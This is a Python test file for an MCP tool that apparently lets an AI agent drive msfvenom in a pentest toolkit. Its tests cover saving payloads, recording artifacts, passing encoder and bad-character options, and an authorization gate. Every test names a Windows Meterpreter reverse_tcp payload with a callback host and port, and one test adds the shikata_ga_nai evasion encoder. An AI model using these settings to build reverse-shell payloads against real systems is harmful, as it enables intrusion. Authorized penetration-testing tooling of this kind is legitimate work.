"""Tests for msfvenom_generate MCP tool."""

import asyncio
import hashlib
from pathlib import Path
from unittest.mock import patch

import pytest


def _call(tool_obj, args):
    fn = getattr(tool_obj, "handler", None) or getattr(tool_obj, "fn", None) or tool_obj
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(fn(args))
    finally:
        loop.close()


def _fake_msfvenom_writes_payload(path: Path, content: bytes = b"\x90\x90PAYLOAD"):
    """Helper: simulate msfvenom writing the payload file."""
    def _side_effect(cmd, **kwargs):
        # locate -o <path> in cmd and write the content
        for i, arg in enumerate(cmd):
            if arg == "-o" and i + 1 < len(cmd):
                Path(cmd[i + 1]).parent.mkdir(parents=True, exist_ok=True)
                Path(cmd[i + 1]).write_bytes(content)
                break
        return {"stdout": "Payload size: 7 bytes\n", "stderr": "", "returncode": 0}
    return _side_effect


def test_msfvenom_writes_to_loot_payloads(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import msfvenom_generate
    with patch("reverser.tools.metasploit._run_msfvenom",
               side_effect=_fake_msfvenom_writes_payload(Path())):
        result = _call(msfvenom_generate, {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.10.14.5", "lport": 4444,
            "format": "exe", "target": "10.10.10.5",
        })
    assert result.get("is_error") is not True
    payloads_dir = tmp_targets_dir / "10.10.10.5" / "loot" / "payloads"
    assert payloads_dir.is_dir()
    written = list(payloads_dir.glob("*.exe"))
    assert len(written) == 1


def test_msfvenom_filename_uses_sha8_and_extension(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import msfvenom_generate
    content = b"PAYLOAD-DATA-FIXED"
    expected_sha8 = hashlib.sha256(content).hexdigest()[:8]
    with patch("reverser.tools.metasploit._run_msfvenom",
               side_effect=_fake_msfvenom_writes_payload(Path(), content=content)):
        _call(msfvenom_generate, {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.10.14.5", "lport": 4444,
            "format": "exe", "target": "10.10.10.5",
        })
    payloads_dir = tmp_targets_dir / "10.10.10.5" / "loot" / "payloads"
    written = list(payloads_dir.glob("*.exe"))
    assert len(written) == 1
    name = written[0].name
    assert expected_sha8 in name
    assert name.endswith(".exe")


def test_msfvenom_records_artifact_fact(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import msfvenom_generate
    from reverser.kb import for_target
    with patch("reverser.tools.metasploit._run_msfvenom",
               side_effect=_fake_msfvenom_writes_payload(Path())):
        _call(msfvenom_generate, {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.10.14.5", "lport": 4444,
            "format": "exe", "target": "10.10.10.5",
        })
    kb = for_target("10.10.10.5")
    artifacts = kb.get_artifacts()
    assert len(artifacts) == 1
    art = artifacts[0]
    assert art.kind == "payload"
    assert art.source_tool == "msfvenom"
    assert art.sha256 is not None
    assert "/loot/payloads/" in art.path


def test_msfvenom_passes_encoder_and_iterations(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import msfvenom_generate
    captured = {}
    def capture(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        # write the file so the rest of the tool succeeds
        for i, a in enumerate(cmd):
            if a == "-o":
                Path(cmd[i + 1]).parent.mkdir(parents=True, exist_ok=True)
                Path(cmd[i + 1]).write_bytes(b"x")
        return {"stdout": "", "stderr": "", "returncode": 0}
    with patch("reverser.tools.metasploit._run_msfvenom", side_effect=capture):
        _call(msfvenom_generate, {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.10.14.5", "lport": 4444,
            "format": "exe", "target": "10.10.10.5",
            "encoder": "x64/shikata_ga_nai", "iterations": 3,
        })
    cmd = captured["cmd"]
    assert "-e" in cmd
    assert "x64/shikata_ga_nai" in cmd
    assert "-i" in cmd
    assert "3" in cmd


def test_msfvenom_passes_bad_chars(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import msfvenom_generate
    captured = {}
    def capture(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        for i, a in enumerate(cmd):
            if a == "-o":
                Path(cmd[i + 1]).parent.mkdir(parents=True, exist_ok=True)
                Path(cmd[i + 1]).write_bytes(b"x")
        return {"stdout": "", "stderr": "", "returncode": 0}
    with patch("reverser.tools.metasploit._run_msfvenom", side_effect=capture):
        _call(msfvenom_generate, {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.10.14.5", "lport": 4444,
            "format": "exe", "target": "10.10.10.5",
            "bad_chars": "\\x00\\x0a\\x0d",
        })
    cmd = captured["cmd"]
    assert "-b" in cmd
    assert "\\x00\\x0a\\x0d" in cmd


def test_msfvenom_msf_command_failure(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import msfvenom_generate
    with patch("reverser.tools.metasploit._run_msfvenom") as mock_run:
        mock_run.return_value = {"stdout": "", "stderr": "Invalid payload",
                                 "returncode": 1}
        result = _call(msfvenom_generate, {
            "payload": "bogus/payload",
            "lhost": "10.10.14.5", "lport": 4444,
            "format": "exe", "target": "10.10.10.5",
        })
    assert result.get("is_error") is True


def test_msfvenom_requires_pentest_auth(tmp_targets_dir, monkeypatch):
    monkeypatch.delenv("REVERSER_PENTEST_AUTHORIZED", raising=False)
    monkeypatch.chdir(tmp_targets_dir)
    from reverser.tools.metasploit import msfvenom_generate
    result = _call(msfvenom_generate, {
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "lhost": "10.10.14.5", "lport": 4444,
        "format": "exe", "target": "10.10.10.5",
    })
    assert result.get("is_error") is True
    assert "authoriz" in result["content"][0]["text"].lower()
